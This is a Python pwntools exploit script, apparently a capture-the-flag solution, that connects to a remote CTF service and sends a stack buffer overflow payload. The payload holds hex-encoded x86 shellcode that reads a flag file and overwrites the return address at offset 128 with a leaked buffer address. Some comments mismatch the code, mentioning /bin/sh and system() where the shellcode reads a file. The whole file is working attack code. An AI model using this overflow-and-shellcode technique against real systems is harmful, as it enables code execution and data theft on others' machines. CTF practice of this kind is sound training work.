#!/bin/env python3
from pwn import *
from pwnlib.asm import * 
from pwnlib import shellcraft
import binascii

exe = context.binary = ELF('super_stack')

io = remote('ctf.hackucf.org', 9005) #exe.process()
#shellcode of cat flag2.txt
hexcode = '6a01fe0c24682e74787468666c616789e331c96a0558cd806a015b89c131d268ffffff7f5e31c0b0bbcd80'
io.recvuntil('buf: ')
bufaddr = int(io.recvline().strip(), base=16)
offset = 128  # offset from start of buffer to return address
# Generate the shellcode that puts /bin/sh on the stack
shellcode = bytes.fromhex(hexcode)
# Append the code that calls system("/bin/sh")
payload = fit({
    0: shellcode,
    100: bufaddr+132,
    offset: p32(bufaddr)
})
#gdb.attach(io)
io.send(payload)
io.interactive()